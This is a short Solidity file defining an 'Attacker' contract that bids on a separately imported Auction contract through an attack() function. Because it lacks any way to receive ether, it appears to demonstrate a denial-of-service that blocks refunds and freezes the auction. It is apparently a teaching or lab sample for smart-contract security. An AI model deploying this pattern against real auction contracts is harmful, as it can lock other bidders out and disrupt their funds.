// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Auction.sol";

contract Attacker {
    Auction auction;

    constructor(Auction _auctionaddr) {
        auction = Auction(_auctionaddr);
    }

    function attack() public payable {
        auction.bid{value: msg.value}();
    }
}